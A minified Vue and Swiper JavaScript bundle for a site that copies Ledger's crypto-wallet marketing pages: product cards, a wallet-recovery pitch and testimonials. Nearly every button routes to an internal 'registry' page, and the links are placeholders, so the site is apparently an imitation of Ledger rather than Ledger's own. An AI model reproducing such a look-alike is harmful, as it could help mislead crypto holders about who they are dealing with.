        w = () => {
            t.el.classList.add(...t.params.navigation.navigationDisabledClass.split(" ")), u()
        };
    Object.assign(t.navigation, {
        enable: g,
        disable: w,
        update: a,
        init: p,
        destroy: u
    })
}

function Ks(e) {
    return e === void 0 && (e = ""), `.${e.trim().replace(/([\.:!+\/])/g,"\\$1").replace(/ /g,".")}`
}

function Cd(e) {
    let {
        swiper: t,
        extendParams: s,
        on: n,
        emit: i
    } = e;
    const r = "swiper-pagination";
    s({
        pagination: {
            el: null,
            bulletElement: "span",
            clickable: !1,
            hideOnClick: !1,
            renderBullet: null,
            renderProgressbar: null,
            renderFraction: null,
            renderCustom: null,
            progressbarOpposite: !1,
            type: "bullets",
            dynamicBullets: !1,
            dynamicMainBullets: 1,
            formatFractionCurrent: v => v,
            formatFractionTotal: v => v,
            bulletClass: `${r}-bullet`,
            bulletActiveClass: `${r}-bullet-active`,
            modifierClass: `${r}-`,
            currentClass: `${r}-current`,
            totalClass: `${r}-total`,
            hiddenClass: `${r}-hidden`,
            progressbarFillClass: `${r}-progressbar-fill`,
            progressbarOppositeClass: `${r}-progressbar-opposite`,
            clickableClass: `${r}-clickable`,
            lockClass: `${r}-lock`,
            horizontalClass: `${r}-horizontal`,
            verticalClass: `${r}-vertical`,
            paginationDisabledClass: `${r}-disabled`
        }
    }), t.pagination = {
        el: null,
        bullets: []
    };
    let o, l = 0;
    const a = v => (Array.isArray(v) ? v : [v]).filter(y => !!y);

    function c() {
        return !t.params.pagination.el || !t.pagination.el || Array.isArray(t.pagination.el) && t.pagination.el.length === 0
    }

    function d(v, y) {
        const {
            bulletActiveClass: C
        } = t.params.pagination;
        v && (v = v[`${y==="prev"?"previous":"next"}ElementSibling`], v && (v.classList.add(`${C}-${y}`), v = v[`${y==="prev"?"previous":"next"}ElementSibling`], v && v.classList.add(`${C}-${y}-${y}`)))
    }

    function p(v) {
        const y = v.target.closest(Ks(t.params.pagination.bulletClass));
        if (!y) return;
        v.preventDefault();
        const C = pi(y) * t.params.slidesPerGroup;
        if (t.params.loop) {
            if (t.realIndex === C) return;
            t.slideToLoop(C)
        } else t.slideTo(C)
    }

    function u() {
        const v = t.rtl,
            y = t.params.pagination;
        if (c()) return;
        let C = t.pagination.el;
        C = a(C);
        let L, M;
        const se = t.virtual && t.params.virtual.enabled ? t.virtual.slides.length : t.slides.length,
            W = t.params.loop ? Math.ceil(se / t.params.slidesPerGroup) : t.snapGrid.length;
        if (t.params.loop ? (M = t.previousRealIndex || 0, L = t.params.slidesPerGroup > 1 ? Math.floor(t.realIndex / t.params.slidesPerGroup) : t.realIndex) : typeof t.snapIndex < "u" ? (L = t.snapIndex, M = t.previousSnapIndex) : (M = t.previousIndex || 0, L = t.activeIndex || 0), y.type === "bullets" && t.pagination.bullets && t.pagination.bullets.length > 0) {
            const N = t.pagination.bullets;
            let P, F, X;
            if (y.dynamicBullets && (o = Wr(N[0], t.isHorizontal() ? "width" : "height", !0), C.forEach(V => {
                    V.style[t.isHorizontal() ? "width" : "height"] = `${o*(y.dynamicMainBullets+4)}px`
                }), y.dynamicMainBullets > 1 && M !== void 0 && (l += L - (M || 0), l > y.dynamicMainBullets - 1 ? l = y.dynamicMainBullets - 1 : l < 0 && (l = 0)), P = Math.max(L - l, 0), F = P + (Math.min(N.length, y.dynamicMainBullets) - 1), X = (F + P) / 2), N.forEach(V => {
                    const te = [...["", "-next", "-next-next", "-prev", "-prev-prev", "-main"].map(ne => `${y.bulletActiveClass}${ne}`)].map(ne => typeof ne == "string" && ne.includes(" ") ? ne.split(" ") : ne).flat();
                    V.classList.remove(...te)
                }), C.length > 1) N.forEach(V => {
                const te = pi(V);
                te === L ? V.classList.add(...y.bulletActiveClass.split(" ")) : t.isElement && V.setAttribute("part", "bullet"), y.dynamicBullets && (te >= P && te <= F && V.classList.add(...`${y.bulletActiveClass}-main`.split(" ")), te === P && d(V, "prev"), te === F && d(V, "next"))
            });
            else {
                const V = N[L];
                if (V && V.classList.add(...y.bulletActiveClass.split(" ")), t.isElement && N.forEach((te, ne) => {
                        te.setAttribute("part", ne === L ? "bullet-active" : "bullet")
                    }), y.dynamicBullets) {
                    const te = N[P],
                        ne = N[F];
                    for (let re = P; re <= F; re += 1) N[re] && N[re].classList.add(...`${y.bulletActiveClass}-main`.split(" "));
                    d(te, "prev"), d(ne, "next")
                }
            }
            if (y.dynamicBullets) {
                const V = Math.min(N.length, y.dynamicMainBullets + 4),
                    te = (o * V - o) / 2 - X * o,
                    ne = v ? "right" : "left";
                N.forEach(re => {
                    re.style[t.isHorizontal() ? ne : "top"] = `${te}px`
                })
            }
        }
        C.forEach((N, P) => {
            if (y.type === "fraction" && (N.querySelectorAll(Ks(y.currentClass)).forEach(F => {
                    F.textContent = y.formatFractionCurrent(L + 1)
                }), N.querySelectorAll(Ks(y.totalClass)).forEach(F => {
                    F.textContent = y.formatFractionTotal(W)
                })), y.type === "progressbar") {
                let F;
                y.progressbarOpposite ? F = t.isHorizontal() ? "vertical" : "horizontal" : F = t.isHorizontal() ? "horizontal" : "vertical";
                const X = (L + 1) / W;
                let V = 1,
                    te = 1;
                F === "horizontal" ? V = X : te = X, N.querySelectorAll(Ks(y.progressbarFillClass)).forEach(ne => {
                    ne.style.transform = `translate3d(0,0,0) scaleX(${V}) scaleY(${te})`, ne.style.transitionDuration = `${t.params.speed}ms`
                })
            }
            y.type === "custom" && y.renderCustom ? (N.innerHTML = y.renderCustom(t, L + 1, W), P === 0 && i("paginationRender", N)) : (P === 0 && i("paginationRender", N), i("paginationUpdate", N)), t.params.watchOverflow && t.enabled && N.classList[t.isLocked ? "add" : "remove"](y.lockClass)
        })
    }

    function g() {
        const v = t.params.pagination;
        if (c()) return;
        const y = t.virtual && t.params.virtual.enabled ? t.virtual.slides.length : t.grid && t.params.grid.rows > 1 ? t.slides.length / Math.ceil(t.params.grid.rows) : t.slides.length;
        let C = t.pagination.el;
        C = a(C);
        let L = "";
        if (v.type === "bullets") {
            let M = t.params.loop ? Math.ceil(y / t.params.slidesPerGroup) : t.snapGrid.length;
            t.params.freeMode && t.params.freeMode.enabled && M > y && (M = y);
            for (let se = 0; se < M; se += 1) v.renderBullet ? L += v.renderBullet.call(t, se, v.bulletClass) : L += `<${v.bulletElement} ${t.isElement?'part="bullet"':""} class="${v.bulletClass}"></${v.bulletElement}>`
        }
        v.type === "fraction" && (v.renderFraction ? L = v.renderFraction.call(t, v.currentClass, v.totalClass) : L = `<span class="${v.currentClass}"></span> / <span class="${v.totalClass}"></span>`), v.type === "progressbar" && (v.renderProgressbar ? L = v.renderProgressbar.call(t, v.progressbarFillClass) : L = `<span class="${v.progressbarFillClass}"></span>`), t.pagination.bullets = [], C.forEach(M => {
            v.type !== "custom" && (M.innerHTML = L || ""), v.type === "bullets" && t.pagination.bullets.push(...M.querySelectorAll(Ks(v.bulletClass)))
        }), v.type !== "custom" && i("paginationRender", C[0])
    }

    function w() {
        t.params.pagination = _d(t, t.originalParams.pagination, t.params.pagination, {
            el: "swiper-pagination"
        });
        const v = t.params.pagination;
        if (!v.el) return;
        let y;
        typeof v.el == "string" && t.isElement && (y = t.el.querySelector(v.el)), !y && typeof v.el == "string" && (y = [...document.querySelectorAll(v.el)]), y || (y = v.el), !(!y || y.length === 0) && (t.params.uniqueNavElements && typeof v.el == "string" && Array.isArray(y) && y.length > 1 && (y = [...t.el.querySelectorAll(v.el)], y.length > 1 && (y = y.filter(C => ud(C, ".swiper")[0] === t.el)[0])), Array.isArray(y) && y.length === 1 && (y = y[0]), Object.assign(t.pagination, {
            el: y
        }), y = a(y), y.forEach(C => {
            v.type === "bullets" && v.clickable && C.classList.add(...(v.clickableClass || "").split(" ")), C.classList.add(v.modifierClass + v.type), C.classList.add(t.isHorizontal() ? v.horizontalClass : v.verticalClass), v.type === "bullets" && v.dynamicBullets && (C.classList.add(`${v.modifierClass}${v.type}-dynamic`), l = 0, v.dynamicMainBullets < 1 && (v.dynamicMainBullets = 1)), v.type === "progressbar" && v.progressbarOpposite && C.classList.add(v.progressbarOppositeClass), v.clickable && C.addEventListener("click", p), t.enabled || C.classList.add(v.lockClass)
        }))
    }

    function b() {
        const v = t.params.pagination;
        if (c()) return;
        let y = t.pagination.el;
        y && (y = a(y), y.forEach(C => {
            C.classList.remove(v.hiddenClass), C.classList.remove(v.modifierClass + v.type), C.classList.remove(t.isHorizontal() ? v.horizontalClass : v.verticalClass), v.clickable && (C.classList.remove(...(v.clickableClass || "").split(" ")), C.removeEventListener("click", p))
        })), t.pagination.bullets && t.pagination.bullets.forEach(C => C.classList.remove(...v.bulletActiveClass.split(" ")))
    }
    n("changeDirection", () => {
        if (!t.pagination || !t.pagination.el) return;
        const v = t.params.pagination;
        let {
            el: y
        } = t.pagination;
        y = a(y), y.forEach(C => {
            C.classList.remove(v.horizontalClass, v.verticalClass), C.classList.add(t.isHorizontal() ? v.horizontalClass : v.verticalClass)
        })
    }), n("init", () => {
        t.params.pagination.enabled === !1 ? x() : (w(), g(), u())
    }), n("activeIndexChange", () => {
        typeof t.snapIndex > "u" && u()
    }), n("snapIndexChange", () => {
        u()
    }), n("snapGridLengthChange", () => {
        g(), u()
    }), n("destroy", () => {
        b()
    }), n("enable disable", () => {
        let {
            el: v
        } = t.pagination;
        v && (v = a(v), v.forEach(y => y.classList[t.enabled ? "remove" : "add"](t.params.pagination.lockClass)))
    }), n("lock unlock", () => {
        u()
    }), n("click", (v, y) => {
        const C = y.target,
            L = a(t.pagination.el);
        if (t.params.pagination.el && t.params.pagination.hideOnClick && L && L.length > 0 && !C.classList.contains(t.params.pagination.bulletClass)) {
            if (t.navigation && (t.navigation.nextEl && C === t.navigation.nextEl || t.navigation.prevEl && C === t.navigation.prevEl)) return;
            const M = L[0].classList.contains(t.params.pagination.hiddenClass);
            i(M === !0 ? "paginationShow" : "paginationHide"), L.forEach(se => se.classList.toggle(t.params.pagination.hiddenClass))
        }
    });
    const S = () => {
            t.el.classList.remove(t.params.pagination.paginationDisabledClass);
            let {
                el: v
            } = t.pagination;
            v && (v = a(v), v.forEach(y => y.classList.remove(t.params.pagination.paginationDisabledClass))), w(), g(), u()
        },
        x = () => {
            t.el.classList.add(t.params.pagination.paginationDisabledClass);
            let {
                el: v
            } = t.pagination;
            v && (v = a(v), v.forEach(y => y.classList.add(t.params.pagination.paginationDisabledClass))), b()
        };
    Object.assign(t.pagination, {
        enable: S,
        disable: x,
        render: g,
        update: u,
        init: w,
        destroy: b
    })
}
const T2 = {
        components: {
            Swiper: Vo,
            SwiperSlide: jo
        },
        data() {
            return {
                displayed: "/images/Buy-1.webp",
                active: 0,
                activeM: 0,
                first: !1,
                second: !1,
                third: !1,
                fourth: !1,
                pagConfig: {
                    type: "fraction",
                    el: ".pag"
                },
                cardContents: [{
                    image: "/images/Buy-1.webp",
                    id: 0,
                    head: "Buy crypto",
                    text: "Buy Bitcoin, Ethereum, and more cryptocurrencies using credit/debit card or bank transfer.",
                    link: "Start buying crypto",
                    activeState: this.first
                }, {
                    image: "/images/Exchange-1.webp",
                    id: 1,
                    head: "Swap crypto",
                    text: "Exchange one cryptocurrency for another, quickly and securely with our providers.",
                    link: "Swap crypto",
                    activeState: this.second
                }, {
                    image: "/images/Grow-1.webp",
                    id: 2,
                    head: "Stake crypto",
                    text: "​​Earn rewards by staking your Ethereum, Solana, Cosmos and more through Ledger Live and passively grow your assets.",
                    link: "Stake crypto now",
                    activeState: this.third
                }, {
                    image: "/images/Connect-1.webp",
                    id: 3,
                    head: "Manage crypto",
                    text: "Securely send and receive more than 500+ cryptocurrencies including Bitcoin, Ethereum, XRP, Cardano and Polygon.",
                    link: "See crypto supported",
                    activeState: this.fourth
                }]
            }
        },
        methods: {
            goregistry() {
                this.$router.push("registry")
            },
            setDisplayed(e, t) {
                this.displayed = e, this.active = t, this.activeM = t, this.setActive()
            },
            setActive() {
                this.activeM = Number(this.$refs.my_pagi.textContent[0]) - 1;
                const e = this.active;
                this.first = !1, this.second = !1, this.third = !1, this.fourth = !1, e === 0 ? this.first = !0 : e === 1 ? this.second = !0 : e === 2 ? this.third = !0 : e === 3 && (this.fourth = !0)
            }
        },
        mounted() {
            this.setActive()
        },
        setup() {
            return {
                modules: [Cd]
            }
        }
    },
    A2 = {
        class: "bg-white px-5 lg:px-20 py-16"
    },
    L2 = {
        class: "lg:flex container mx-auto"
    },
    I2 = {
        class: "w-full max-w-max hidden lg:block"
    },
    N2 = {
        class: "pr-16 max-w-[500px] w-full"
    },
    P2 = ["src"],
    M2 = {
        class: ""
    },
    k2 = f("div", {
        class: "mb-20 top-0"
    }, [f("h6", {
        class: "text-lg mb-3"
    }, "Ledger Live"), f("h3", {
        class: "text-3xl lg:text-4xl font-[500] font-halpha"
    }, [gt(" THE CRYPTO APP "), f("br", {
        class: "hidden lg:block"
    }), gt(" FOR SELF-CUSTODIANS ")])], -1),
    O2 = {
        class: "mx-auto container lg:hidden"
    },
    $2 = {
        class: ""
    },
    R2 = {
        class: "w-full mb-20"
    },
    D2 = {
        class: "lg:pr-16 w-full h-72"
    },
    H2 = ["src"],
    V2 = ["onClick", "aria-expanded"],
    j2 = {
        class: "font-[500] mb-2 text-xl"
    },
    B2 = {
        class: "text-[1rem] mb-3 text-[1rem]"
    },
    F2 = {
        href: "#"
    },
    z2 = {
        class: "text-[1rem] font-[700] underline"
    },
    U2 = f("i", {
        class: "ri-arrow-right-line text-lg"
    }, null, -1),
    G2 = {
        class: "pag text-black hidden",
        ref: "my_pagi"
    },
    W2 = {
        class: "flex gap-2 lg:hidden relative bottom-52"
    },
    q2 = {
        class: "hidden lg:grid lg:grid-cols-2 gap-x-10 gap-y-20"
    },
    K2 = ["onClick", "aria-expanded"],
    Z2 = {
        class: "font-[400] mb-2"
    },
    X2 = {
        class: "text-[1rem] mb-3"
    },
    Y2 = {
        href: "#"
    },
    Q2 = {
        class: "text-[1rem] font-[700] underline"
    },
    J2 = f("i", {
        class: "ri-arrow-right-line text-lg"
    }, null, -1);

function eg(e, t, s, n, i, r) {
    const o = ce("SwiperSlide"),
        l = ce("Swiper");
    return O(), R("section", A2, [f("div", L2, [f("div", I2, [f("div", N2, [f("img", {
        src: i.displayed,
        alt: "buy-image",
        class: "w-full"
    }, null, 8, P2)])]), f("div", M2, [k2, f("div", O2, [q(l, {
        class: "h-max w-full",
        modules: n.modules,
        pagination: i.pagConfig,
        onSlideChange: r.setActive
    }, {
        default: Mt(() => [(O(!0), R(he, null, Ke(i.cardContents, a => (O(), Vs(o, {
            key: a.id
        }, {
            default: Mt(() => [f("div", $2, [f("div", R2, [f("div", D2, [f("img", {
                src: a.image,
                alt: "buy-image",
                class: "h-full mx-auto"
            }, null, 8, H2)])]), f("div", {
                onClick: c => r.setDisplayed(a.image, a.id),
                "aria-expanded": a.activeState
            }, [f("h4", j2, ye(a.head), 1), f("p", B2, ye(a.text), 1), f("a", F2, [f("button", {
                onClick: t[0] || (t[0] = c => r.goregistry()),
                class: "flex items-center gap-1"
            }, [f("p", z2, ye(a.link), 1), U2])])], 8, V2)])]),
            _: 2
        }, 1024))), 128))]),
        _: 1
    }, 8, ["modules", "pagination", "onSlideChange"]), f("div", G2, null, 512)]), f("div", W2, [(O(!0), R(he, null, Ke(i.cardContents, a => (O(), R("div", {
        key: a.id,
        class: Te(["pt-[2px] bg-gray-200 w-1/4", {
            activeMob: a.id === i.activeM
        }])
    }, null, 2))), 128))]), f("div", q2, [(O(!0), R(he, null, Ke(i.cardContents, a => (O(), R("div", {
        key: a.id,
        class: "activated",
        onClick: c => r.setDisplayed(a.image, a.id),
        "aria-expanded": a.activeState
    }, [f("h4", Z2, ye(a.head), 1), f("p", X2, ye(a.text), 1), f("a", Y2, [f("button", {
        onClick: t[1] || (t[1] = c => r.goregistry()),
        class: "flex items-center gap-1"
    }, [f("p", Q2, ye(a.link), 1), J2])])], 8, K2))), 128))])])])])
}
const tg = Se(T2, [
        ["render", eg]
    ]),
    sg = {
        props: ["icon", "text"]
    },
    ng = {
        class: "bg-white rounded text-black flex items-center gap-2 px-1"
    },
    ig = {
        class: "text-sm"
    };

function rg(e, t, s, n, i, r) {
    return O(), R("div", ng, [f("i", {
        class: Te([s.icon, "text-sm"])
    }, null, 2), f("p", ig, ye(s.text), 1)])
}
const og = Se(sg, [
        ["render", rg]
    ]),
    ag = {
        name: "ledger_card",
        props: ["heading", "text", "image", "rated", "options"],
        components: {
            LedgerCardOptions: og
        }
    },
    lg = {
        class: "md:w-[30%] bg-[rgba(255,255,255,0.08)] hover:bg-[hsla(0,0%,100%,.16)] duration-500 rounded-lg ledger"
    },
    cg = {
        class: "py-4"
    },
    dg = {
        class: "w-1/2 mx-auto h-40 image duration-500"
    },
    fg = ["src"],
    pg = {
        class: "p-6 h-full"
    },
    ug = {
        class: "text-2xl title-font font-semibold leading-10 lg:text-4xl mb-3"
    },
    hg = {
        class: "text-lg-orange text-sm"
    },
    gg = {
        key: 0,
        class: "flex w-max lg:mx-0 gap-2 mb-5"
    },
    mg = vt('<span class=""><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-half-fill"></i></span><p class="text-gray-400">4.5/5 - 1 213 Reviews</p>', 2),
    vg = [mg],
    yg = {
        key: 1,
        class: "text-xs"
    },
    bg = {
        class: "leading-relaxed text-[1.05rem] mb-10"
    },
    wg = {
        class: "flex flex-wrap gap-2 mb-5"
    },
    xg = f("div", {
        class: "flex items-center flex-wrap text-sm font-semibold"
    }, [f("a", {
        class: "text-white inline-flex items-center underline"
    }, [gt("Learn More "), f("i", {
        class: "ri-arrow-right-line"
    })])], -1);

function _g(e, t, s, n, i, r) {
    const o = ce("LedgerCardOptions");
    return O(), R("div", lg, [f("div", cg, [f("div", dg, [f("img", {
        class: "object-ccontain object-center h-full mx-auto",
        src: s.image,
        alt: "blog"
    }, null, 8, fg)]), f("div", pg, [f("h2", ug, ye(s.heading), 1), f("div", hg, [s.rated ? (O(), R("div", gg, vg)) : (O(), R("p", yg, "Coming soon"))]), f("p", bg, ye(s.text), 1), f("div", wg, [(O(!0), R(he, null, Ke(s.options, l => (O(), Vs(o, {
        key: l.text,
        icon: l.icon,
        text: l.text
    }, null, 8, ["icon", "text"]))), 128))]), xg])])])
}
const Cg = Se(ag, [
        ["render", _g]
    ]),
    Sg = {
        data() {
            return {
                firstOPtions: [{
                    icon: "ri-tv-2-line",
                    text: "Desktop"
                }, {
                    icon: "ri-usb-line",
                    text: "USB-C"
                }, {
                    icon: "ri-coins-line",
                    text: "Crypto & NFT"
                }],
                secondOPtions: [{
                    icon: "ri-tv-2-line",
                    text: "Desktop"
                }, {
                    icon: "ri-bluetooth-fill",
                    text: "Bluetooth"
                }, {
                    icon: "ri-usb-line",
                    text: "USB-C"
                }, {
                    icon: "ri-coins-line",
                    text: "Crypto & NFT"
                }],
                thirdOptions: [{
                    icon: "ri-tv-2-line",
                    text: "Desktop"
                }, {
                    icon: "ri-bluetooth-fill",
                    text: "Bluetooth"
                }, {
                    icon: "ri-usb-line",
                    text: "USB-C"
                }, {
                    icon: "ri-smartphone-line",
                    text: "Larger screen"
                }, {
                    icon: "ri-coins-line",
                    text: "Crypto & NFT"
                }]
            }
        },
        components: {
            Ledgercard: Cg
        }
    },
    Eg = {
        class: "flex flex-col gap-5 md:flex-row container mx-auto justify-center lg:gap-7"
    };

function Tg(e, t, s, n, i, r) {
    const o = ce("Ledgercard");
    return O(), R("div", Eg, [q(o, {
        image: "/images/NanoSP.webp",
        heading: "Ledger Nano S Plus",
        text: "The perfect entry-level crypto wallet to securely manage all your crypto and NFTs.",
        rated: !0,
        options: i.firstOPtions
    }, null, 8, ["options"]), q(o, {
        image: "/images/NanoX-white-screen.webp",
        heading: "Ledger Nano X",
        text: "Secure and manage your crypto & NFTs on-the-go with our Bluetooth®-enabled crypto wallet.",
        rated: "true",
        options: i.secondOPtions
    }, null, 8, ["options"]), q(o, {
        image: "/images/Staxmain-1.webp",
        heading: "Ledger Stax",
        text: "Our most advanced and customizable crypto wallet yet, enjoy a curved E Ink touchscreen crypto-experience unlike ever before.",
        options: i.thirdOptions
    }, null, 8, ["options"])])
}
const Ag = Se(Sg, [
        ["render", Tg]
    ]),
    Lg = {
        components: {
            LedgerRow: Ag
        },
        methods: {
            goregistry() {
                this.$router.push("registry")
            }
        }
    },
    Ig = {
        class: "mx-auto px-4 py-12 md:px-8 text-white bg-grad-purple-bg relative lg:px-20"
    },
    Ng = {
        class: "items-start justify-between py-4 lg:flex container mx-auto"
    },
    Pg = {
        class: "mb-5"
    },
    Mg = f("h3", {
        class: "text-2xl font-[500] text-center lg:text-left lg:text-4xl lg:w-full mb-10 lg:mb-24"
    }, [gt(" Find your perfect "), f("br", {
        class: "lg:hidden"
    }), gt(" Ledger wallet ")], -1),
    kg = {
        class: "mx-auto lg:absolute lg:top-12 lg:right-12 xl:right-44 lg:mt-3 lg:mb-0 inline border-0 py-3 px-7 font-semibold flex gap-3 items-center mb-5 bg-white rounded-full text-black"
    },
    Og = f("i", {
        class: "ri-arrow-right-line text-xs"
    }, null, -1);

function $g(e, t, s, n, i, r) {
    const o = ce("LedgerRow");
    return O(), R("section", Ig, [f("div", Ng, [f("div", Pg, [Mg, q(o)]), f("button", kg, [f("p", {
        class: "text-sm lg:text-lg",
        onClick: t[0] || (t[0] = l => r.goregistry())
    }, "Compare our wallets"), Og])])])
}
const Rg = Se(Lg, [
        ["render", $g]
    ]),
    Dg = {},
    Hg = {
        class: "relative bg-lg-bg pt-16 pb-5"
    },
    Vg = {
        class: "relative z-10 mx-auto px-5 md:text-center md:px-8 bg-lg-bg flex flex-col items-center"
    },
    jg = f("div", {
        class: "md:mx-auto"
    }, [f("p", {
        class: "text-white text-3xl font-semibold text-center lg:text-5xl lg:w-full"
    }, " Wallet recovery made easy "), f("p", {
        class: "text-blue-100 mt-3 text-center text-lg mb-4 tracking-loose lg:text-xl"
    }, " Get a secure backup for your secret recovery phrase ready whenever you need it. ")], -1),
    Bg = {
        href: "#",
        class: "flex w-full justify-center mb-16"
    },
    Fg = f("i", {
        class: "ri-arrow-right-line ml-2 abs"
    }, null, -1),
    zg = f("p", {
        class: "text-white mx-auto text-xs w-max lg:mx-0 gap-2 bg-[rgba(60,60,60,0.5)] rounded-md py-2 px-2 mt-7"
    }, " Ledger Recover, provided by Coincover ", -1);

function Ug(e, t, s, n, i, r) {
    return O(), R("section", Hg, [f("div", Vg, [jg, f("a", Bg, [f("button", {
        onClick: t[0] || (t[0] = o => e.goregistry()),
        class: "text-lg text-white bg-lg-orange rounded-full px-5 py-3 font-medium lg:text-xl orange-btn"
    }, [gt(" Get started"), Fg])]), zg])])
}
const Gg = Se(Dg, [
        ["render", Ug]
    ]),
    Wg = {
        data() {
            return {
                myActions: [{
                    image: "/images/homepage-get-started.webp",
                    head: "NEW TO THE CRYPTO WORLD?",
                    action: "Get started with our smart insider tips.",
                    link: "Get started with crypto"
                }, {
                    image: "/images/homepage-academy-block.webp",
                    head: "WANT TO BECOME A CRYPTO EXPERT?",
                    action: "Get fresh crypto insights with Ledger Academy.",
                    link: "Become a crypto expert"
                }]
            }
        },
        methods: {
            goregistry() {
                this.$router.push("registry")
            }
        }
    },
    qg = {
        class: "body-font bg-white px-3 pt-16"
    },
    Kg = {
        class: "container mx-auto"
    },
    Zg = {
        class: "flex flex-col gap-5 md:flex-row lg:gap-20 justify-center"
    },
    Xg = {
        class: "h-full bg-[#f1f1f1] px-5 pt-3 pb-5 overflow-hidden text-left relative lg:px-20"
    },
    Yg = {
        class: "px-10 w-full max-w-96 mx-auto mb-16"
    },
    Qg = ["src"],
    Jg = {
        class: "title-font text-sm font-[600] text-gray-900 mb-3"
    },
    e3 = {
        class: "leading-relaxed mb-8 text-2xl lg:text-4xl font-[500]"
    },
    t3 = {
        class: "underline text-sm lg:text-lg"
    },
    s3 = f("i", {
        class: "ri-arrow-right-line text-xl"
    }, null, -1);

function n3(e, t, s, n, i, r) {
    return O(), R("section", qg, [f("div", Kg, [f("div", Zg, [(O(!0), R(he, null, Ke(i.myActions, o => (O(), R("div", {
        key: o.head,
        class: "lg:w-[45%]"
    }, [f("div", Xg, [f("div", Yg, [f("img", {
        src: o.image,
        alt: "card-img",
        class: "w-full"
    }, null, 8, Qg)]), f("h1", Jg, ye(o.head), 1), f("p", e3, ye(o.action), 1), f("button", {
        onClick: t[0] || (t[0] = l => r.goregistry()),
        class: "block border-0 font-semibold flex gap-5 items-center"
    }, [f("p", t3, ye(o.link), 1), s3])])]))), 128))])])])
}
const i3 = Se(Wg, [
        ["render", n3]
    ]),
    r3 = "/images/home-seo-carousel-1.webp",
    o3 = {
        name: "ContactForm",
        data() {
            return {
                servicesItems: ["Mobile development", "UI/UX Design", "web development", "SEO"]
            }
        }
    },
    a3 = {
        class: "flex flex-col lg:grid w-full grid-cols-2 lg:aspect-[1.5]"
    },
    l3 = f("div", {
        class: "h-72 bg-[rgb(212,160,255)] w-full lg:h-auto"
    }, [f("img", {
        class: "h-full mx-auto lg:w-full",
        src: r3
    })], -1),
    c3 = {
        class: "bg-lg-darkblue px-5 py-10 md:px-20 self-stretch text-white flex flex-col justify-center"
    },
    d3 = f("h3", {
        class: "lg:text-5xl text-4xl uppercase font-halpha font-[500] mb-10"
    }, " What is a hardware wallet? ", -1),
    f3 = f("p", {
        class: "text-sm"
    }, " A hardware wallet is a cryptocurrency wallet which stores the user's private keys (critical piece of information used to authorise outgoing transactions on the blockchain network) in a secure hardware device. The main principle behind hardware wallets is to provide full isolation between the private keys and your easy-to-hack computer or smartphone. ", -1),
    p3 = f("p", {
        class: "underline text-sm lg:text-lg"
    }, " Learn more about crypto wallets ", -1),
    u3 = f("i", {
        class: "ri-arrow-right-line lg:text-xs"
    }, null, -1),
    h3 = [p3, u3];

function g3(e, t, s, n, i, r) {
    return O(), R("main", a3, [l3, f("div", c3, [d3, f3, f("button", {
        onClick: t[0] || (t[0] = o => e.goregistry()),
        class: "lg:mb-0 border-0 py-4 font-semibold flex gap-5 items-center"
    }, h3)])])
}
const m3 = Se(o3, [
        ["render", g3]
    ]),
    v3 = "/images/home-seo-carousel-2-2.webp",
    y3 = {
        name: "ContactForm",
        data() {
            return {
                servicesItems: ["Mobile development", "UI/UX Design", "web development", "SEO"]
            }
        },
        methods: {
            goregistry() {
                this.$router.push("registry")
            }
        }
    },
    b3 = {
        class: "flex flex-col lg:grid grid-cols-2 self-stretch lg:aspect-[1.5]"
    },
    w3 = f("div", {
        class: "h-72 bg-[rgb(212,160,255)] w-full bg-lg-orange lg:h-auto lg:py-24 lg:px-10"
    }, [f("img", {
        class: "mx-auto h-full pt-10 lg:pt-0",
        src: v3
    })], -1),
    x3 = {
        class: "bg-lg-darkblue px-5 md:px-20 py-7 lg:py-20 text-white"
    },
    _3 = f("h3", {
        class: "lg:text-5xl font-[500] mb-10 text-4xl font-halpha uppercase"
    }, " Learn more about Ledger’s crypto wallet ", -1),
    C3 = f("p", {
        class: "text-sm"
    }, " At Ledger we are developing hardware wallet technology that provides the highest level of security for crypto assets. Our products combine a Secure Element and a proprietary OS designed specifically to protect your assets. Ledger hardware wallets empower you with the ownership and control of your private keys. ", -1),
    S3 = f("p", {
        class: "underline text-sm lg:text-lg"
    }, " Why choose Ledger cold wallet ", -1),
    E3 = f("i", {
        class: "ri-arrow-right-line lg:text-xs"
    }, null, -1),
    T3 = [S3, E3];

function A3(e, t, s, n, i, r) {
    return O(), R("main", b3, [w3, f("div", x3, [_3, C3, f("button", {
        onClick: t[0] || (t[0] = o => r.goregistry()),
        class: "lg:mb-0 border-0 py-4 font-semibold flex gap-5 items-center"
    }, T3)])])
}
const L3 = Se(y3, [
        ["render", A3]
    ]),
    I3 = {
        data() {
            return {
                cardContents: ["", ""],
                activeM: 0,
                pagConfig: {
                    type: "fraction",
                    el: ".paga"
                }
            }
        },
        components: {
            Swiper: Vo,
            SwiperSlide: jo,
            SliderItem1: m3,
            SliderItem2: L3
        },
        methods: {
            setActive() {
                this.activeM = Number(this.$refs.my_pagi.textContent[0]) - 1
            }
        },
        setup() {
            return {
                modules: [Cd]
            }
        }
    },
    N3 = {
        class: "flex gap-5 pt-10 justify-center"
    },
    P3 = {
        class: "paga hidden",
        ref: "my_pagi"
    };

function M3(e, t, s, n, i, r) {
    const o = ce("SliderItem1"),
        l = ce("swiper-slide"),
        a = ce("SliderItem2"),
        c = ce("swiper");
    return O(), R("div", null, [q(c, {
        pagination: i.pagConfig,
        modules: n.modules,
        class: "mySwiper",
        onSlideChange: r.setActive
    }, {
        default: Mt(() => [q(l, null, {
            default: Mt(() => [q(o)]),
            _: 1
        }), q(l, null, {
            default: Mt(() => [q(a)]),
            _: 1
        })]),
        _: 1
    }, 8, ["pagination", "modules", "onSlideChange"]), f("div", N3, [(O(!0), R(he, null, Ke(i.cardContents, (d, p) => (O(), R("div", {
        key: d.id,
        class: Te(["pt-[2px] bg-gray-200 w-1/4", {
            activeMob: p === i.activeM
        }])
    }, null, 2))), 128))]), f("div", P3, null, 512)])
}
const k3 = Se(I3, [
        ["render", M3],
        ["__scopeId", "data-v-e97612a6"]
    ]),
    O3 = {
        name: "testy_stuffs",
        components: {
            Swiper: Vo,
            SwiperSlide: jo
        },
        data() {
            return {
                testimonials: [{
                    avatar: "/images/janet.jpg",
                    name: "Janet_Oganah",
                    title: "Janet Onagah",
                    quote: "ledger = peace of mind. I'm sure some of us know that unsettling feeling when you know you need a Ledger but haven't quite organized yourself to get it sorted. If I did it all again, I'd start with having a Ledger."
                }, {
                    avatar: "/images/primenic.jpg",
                    name: "primenic_eth",
                    title: "PrimeNic.eth",
